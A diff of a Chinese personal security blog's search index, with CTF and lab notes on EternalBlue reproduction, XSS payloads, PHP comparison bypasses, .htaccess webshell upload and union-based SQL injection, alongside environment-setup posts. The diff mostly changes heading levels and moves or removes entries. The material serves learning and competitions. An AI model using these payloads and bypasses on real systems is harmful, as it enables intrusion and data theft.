 <p>在window server 2012中启动Guest账号</p>
 <p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
 <p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
-<h3 id="2-攻击"><a class="header-anchor" href="#2-攻击"></a>2.攻击</h3>
+<h2 id="2-攻击"><a class="header-anchor" href="#2-攻击"></a>2.攻击</h2>
 <p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
 <p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
 <p>下载到kali后后使用NASM工具对asm代码编译</p>
@@ -249,16 +230,35 @@
       </tags>
   </entry>
   <entry>
+    <title>Ubuntu (20.04)虚拟机安装配置</title>
+    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
+<h1>换源</h1>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
+<h1>安装中文输入法</h1>
+<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
+<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
+<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo博客搭建</title>
     <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="1-安装配置-node-js"><a class="header-anchor" href="#1-安装配置-node-js"></a>1. 安装配置 node.js</h2>
+    <content><![CDATA[<h1>1. 安装配置 node.js</h1>
 <p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
 <p><strong>npm to cnpm</strong></p>
 <p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
-<h2 id="2-安装配置-Git"><a class="header-anchor" href="#2-安装配置-Git"></a>2. 安装配置 Git</h2>
+<h1>2. 安装配置 Git</h1>
 <p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
 <p>安装完成即可，没有必要配置ssh</p>
-<h2 id="3-安装-hexo"><a class="header-anchor" href="#3-安装-hexo"></a>3. 安装 hexo</h2>
+<h1>3. 安装 hexo</h1>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
 <p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
@@ -274,7 +274,7 @@
   <entry>
     <title>虚拟机中kali(Debian)的网卡配置及SSH配置</title>
     <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E5%8F%8ASSH%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
+    <content><![CDATA[<h1>网卡配置</h1>
 <p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
 <img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E5%8F%8ASSH%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
 <p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
@@ -293,7 +293,7 @@
 <p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
 <p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
 <p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
-<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
+<h1>SSH配置</h1>
 <p>一般来说，kali默认已经安装了SSH</p>
 <p>首先查看SSH状态</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
@@ -323,7 +323,7 @@
   <entry>
     <title>XSS</title>
     <url>/2020/08/03/CTF/Web/XSS/</url>
-    <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
+    <content><![CDATA[<h1>反射型XSS</h1>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"test"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
@@ -339,24 +339,24 @@
   <entry>
     <title>代码审计</title>
     <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
-<h3 id="1-MD5"><a class="header-anchor" href="#1-MD5"></a>1. MD5</h3>
+    <content><![CDATA[<h1>PHP函数漏洞及其绕过姿势</h1>
+<h2 id="1-MD5"><a class="header-anchor" href="#1-MD5"></a>1. MD5</h2>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a[]&#x3D;1;</span><br><span class="line">$b[]&#x3D;2;</span><br><span class="line">md5($a)&#x3D;&#x3D;&#x3D;md5($b);	&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
 <hr>
 <p>md5计算结果为<code>0e...</code>的，会被当做0处理</p>
 <p>以下这些字符串，md5哈希之后都是0e开头的：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;比较特殊的一个，加密前后进行比较的话会判断为相等</span><br><span class="line">0e215962017</span><br><span class="line">0e291242476940776845150308577824</span><br></pre></td></tr></table></figure>
-<h3 id="2-intval"><a class="header-anchor" href="#2-intval"></a>2. intval</h3>
+<h2 id="2-intval"><a class="header-anchor" href="#2-intval"></a>2. intval</h2>
 <p>得到一个数的整型值。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'0x1A'</span>);				  <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>比如在以下代码中</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span>(intval($a)&lt;<span class="number">2020</span> &amp;&amp; intval($a+<span class="number">1</span>)&gt;<span class="number">2020</span>)</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
 <p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;0x10ff	&#x2F;&#x2F;在进行+1运算时，$a会被转换为数值型进行运算.</span><br></pre></td></tr></table></figure>
-<h3 id="3-is-numeric"><a class="header-anchor" href="#3-is-numeric"></a>3. is_numeric</h3>
+<h2 id="3-is-numeric"><a class="header-anchor" href="#3-is-numeric"></a>3. is_numeric</h2>
 <p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
 <p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
-<h3 id="4-mt-rand"><a class="header-anchor" href="#4-mt-rand"></a>4. mt_rand</h3>
+<h2 id="4-mt-rand"><a class="header-anchor" href="#4-mt-rand"></a>4. mt_rand</h2>
 <p>生成伪随机数，利用<code>php_mt_seed</code>可以通过已知随机数数列爆破出随机数种子</p>
 ]]></content>
       <categories>
@@ -369,90 +369,9 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
-<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
-<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
-<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
-<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
-<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
-<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入</title>
-    <url>/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
-<h3 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h3>
-<ol>
-<li>
-<p>查询表中的所有记录，但页面只返回1条（前几条）怎么办？</p>
-<p>使用字符串连接函数：<code>concat()</code> , <code>concat_ws()</code> , <code>group_concat()</code> 等将多条记录的某个字段合并成一个字符串</p>
-<p>eg:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">name</span>) <span class="keyword">from</span> security.user;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/image-20200810162953419.png" alt="image-20200810162953419"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>CTF</tag>
-        <tag>sqli</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>压缩包破解</title>
-    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
-    <content><![CDATA[<h2 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h2>
-<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
-<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
-<p>而压缩包中也存在该文件</p>
-<p>考虑ZIP明文攻击</p>
-<ol>
-<li>
-<p>将 readme.txt 压缩为 readme.zip</p>
-</li>
-<li>
-<p>使用 bandzip 打开，查看CRC校验码</p>
-</li>
-<li>
-<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
-</li>
-<li>
-<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
-<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含</title>
     <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
+    <content><![CDATA[<h1>[“百度杯” 2017 二月场] include</h1>
 <p>简单的文件包含题。</p>
 <p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
 <p>在phpinfo中可以发现</p>
@@ -478,116 +397,88 @@
       </tags>
   </entry>
   <entry>
-    <title>ACTF校赛Web</title>
-    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
-    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
-<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
-<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
-<p>关注公众号，回复“一句话”即可</p>
-<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
-<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
-<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
-<p>列换位密码，用密码学实验的脚本跑一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
-<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
-<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<p>一个数字型SQL回显注入</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/ACTF%E6%A0%A1%E8%B5%9BWeb%5Cimage-20200529222156910.png" alt="image-20200529222156910"></p>
-<p>首先猜出字段数为4</p>
-<p>联合查询得到数据库名</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
-<p>数据表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
-<p>列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
-<p>读取数据</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
-<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
+    <title>文件上传</title>
+    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1>[MRCTF2020] 你传你🐎呢</h1>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
+<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
+<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
+<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
+<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
+        <category>web</category>
       </categories>
       <tags>
+        <tag>漏洞</tag>
         <tag>CTF</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
-    <title>国赛2020WP</title>
-    <url>/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
-    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
-<h3 id="签到"><a class="header-anchor" href="#签到"></a>签到</h3>
-<p>助力即可得到flag</p>
-<h3 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h3>
-<p>解压得到二进制文件:flag</p>
-<p>使用winhex打开</p>
-<p>观察到</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
-<p>即flag的值</p>
-<h3 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h3>
-<p>解压缩包得到disk_dump文件</p>
-<p>使用file 命令查看信息</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
-<p>可以看到是ext3的文件系统</p>
-<p>挂载到 test文件夹下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount .&#x2F;disk_dump .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
-<p>查看???.png，提示flag已被删除</p>
-<p>使用extundelete恢复被删除的文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete .&#x2F;disk_dump --restore-all</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
-<p>得到flag.txt，但打开后是乱码</p>
-<p>返回test/misc01文件夹下，看到可执行文件demo</p>
-<p>使用strings命令查看</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
-<p>猜测demo对flag.txt进行了处理</p>
-<p>使用ida反编译查看其伪源码</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
-<p>编写代码对flag文件进行解码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fileOld = fopen(<span class="string">"D:\\flag.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">    FILE *fileNew = fopen(<span class="string">"D:\\flagNew.txt"</span>,<span class="string">"rb+"</span>);</span><br><span class="line">    <span class="keyword">char</span> v1,v4,v5;</span><br><span class="line">    v4 = <span class="number">34</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = fgetc(fileOld);</span><br><span class="line">        <span class="keyword">if</span>( v1 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fputc(((v1^v4)-v5),fileNew);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fileNew);</span><br><span class="line">    fclose(fileOld);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解码后得到flag</p>
